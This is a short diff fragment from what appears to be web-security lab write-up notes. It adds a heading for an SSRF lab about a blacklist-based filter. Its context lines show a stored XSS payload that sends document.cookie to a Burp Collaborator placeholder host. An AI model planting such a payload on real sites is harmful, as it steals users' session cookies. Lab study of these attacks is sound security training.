@@ -35,3 +35,5 @@ Write this payload into comment section:
 ```js
 <script> document.location = "http://<BURP-COLLABORATOR>/?" + document.cookie </script>
 ```
+
+# [0x4] Lab: SSRF with blacklist-based input filter
